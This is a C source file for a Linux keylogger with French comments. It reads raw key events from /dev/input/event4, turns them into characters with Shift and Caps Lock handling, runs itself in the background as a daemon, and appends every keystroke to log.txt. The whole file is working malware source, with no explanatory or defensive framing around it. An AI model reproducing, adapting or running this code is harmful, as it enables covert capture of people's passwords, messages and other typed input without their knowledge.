#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <signal.h>
#include <stdbool.h>

#define DEVICE "/dev/input/event4"
#define LOG_FILE "log.txt"

int fd = -1;
FILE *logfile = NULL;
bool shift_pressed = false;
bool caps_lock = false;

// Table de correspondance simplifiée pour les touches (QWERTY/AZERTY de base)
const char *map_key(int code, bool shifted) {
    switch (code) {
        case KEY_A: return shifted ? "A" : "a";
        case KEY_B: return shifted ? "B" : "b";
        case KEY_C: return shifted ? "C" : "c";
        case KEY_D: return shifted ? "D" : "d";
        case KEY_E: return shifted ? "E" : "e";
        case KEY_F: return shifted ? "F" : "f";
        case KEY_G: return shifted ? "G" : "g";
        case KEY_H: return shifted ? "H" : "h";
        case KEY_I: return shifted ? "I" : "i";
        case KEY_J: return shifted ? "J" : "j";
        case KEY_K: return shifted ? "K" : "k";
        case KEY_L: return shifted ? "L" : "l";
        case KEY_M: return shifted ? "M" : "m";
        case KEY_N: return shifted ? "N" : "n";
        case KEY_O: return shifted ? "O" : "o";
        case KEY_P: return shifted ? "P" : "p";
        case KEY_Q: return shifted ? "Q" : "q";
        case KEY_R: return shifted ? "R" : "r";
        case KEY_S: return shifted ? "S" : "s";
        case KEY_T: return shifted ? "T" : "t";
        case KEY_U: return shifted ? "U" : "u";
        case KEY_V: return shifted ? "V" : "v";
        case KEY_W: return shifted ? "W" : "w";
        case KEY_X: return shifted ? "X" : "x";
        case KEY_Y: return shifted ? "Y" : "y";
        case KEY_Z: return shifted ? "Z" : "z";
        
        case KEY_1: return shifted ? "!" : "1";
        case KEY_2: return shifted ? "@" : "2";
        case KEY_3: return shifted ? "#" : "3";
        case KEY_4: return shifted ? "$" : "4";
        case KEY_5: return shifted ? "%" : "5";
        case KEY_6: return shifted ? "^" : "6";
        case KEY_7: return shifted ? "&" : "7";
        case KEY_8: return shifted ? "*" : "8";
        case KEY_9: return shifted ? "(" : "9";
        case KEY_0: return shifted ? ")" : "0";

        case KEY_SPACE: return " ";
        case KEY_ENTER: return "\n";
        case KEY_TAB: return "\t";
        case KEY_BACKSPACE: return "[BACKSPACE]";
        case KEY_DOT: return shifted ? ">" : ".";
        case KEY_COMMA: return shifted ? "<" : ",";
        case KEY_SLASH: return shifted ? "?" : "/";
        case KEY_SEMICOLON: return shifted ? ":" : ";";
        case KEY_APOSTROPHE: return shifted ? "\"" : "'";
        case KEY_MINUS: return shifted ? "_" : "-";
        case KEY_EQUAL: return shifted ? "+" : "=";
        case KEY_LEFTBRACE: return shifted ? "{" : "[";
        case KEY_RIGHTBRACE: return shifted ? "}" : "]";
        case KEY_BACKSLASH: return shifted ? "|" : "\\";
        case KEY_GRAVE: return shifted ? "~" : "`";

        default: return NULL; // Ignorer les autres touches (F1, CTRL, ALT, etc.)
    }
}

void cleanup(int sig) {
    if (logfile) {
        fprintf(logfile, "\n--- Keylogger stopped ---\n");
        fclose(logfile);
    }
    if (fd != -1) close(fd);
    exit(0);
}

int main() {
    fd = open(DEVICE, O_RDONLY);
    if (fd < 0) {
        perror("Erreur : Impossible d'ouvrir le périphérique");
        return EXIT_FAILURE;
    }

    logfile = fopen(LOG_FILE, "a");
    if (!logfile) {
        perror("Erreur : Impossible d'ouvrir le fichier log.txt");
        close(fd);
        return EXIT_FAILURE;
    }

    signal(SIGINT, cleanup);
    signal(SIGTERM, cleanup);

    if (daemon(1, 0) < 0) {
        perror("Erreur lors du passage en arrière-plan");
        cleanup(0);
    }

    struct input_event ev;
    while(read(fd, &ev, sizeof(ev)) > 0) {
        if (ev.type == EV_KEY) {
            // Gestion de l'état SHIFT
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                if (ev.value == 1) shift_pressed = true;  // Pressé
                else if (ev.value == 0) shift_pressed = false; // Relâché
                continue;
            }

            // Gestion du CAPS_LOCK (bascule au moment du pressé uniquement)
            if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
                caps_lock = !caps_lock;
                continue;
            }

            // Capture du caractère au moment du pressé (value == 1) ou autorepeat (value == 2)
            if (ev.value >= 1) {
                bool is_upper = (shift_pressed != caps_lock); // XOR logique pour Majuscules
                const char *text = map_key(ev.code, is_upper);
                
                if (text) {
                    fprintf(logfile, "%s", text);
                    fflush(logfile);
                }
            }
        }
    }

    cleanup(0);
    return 0;
}
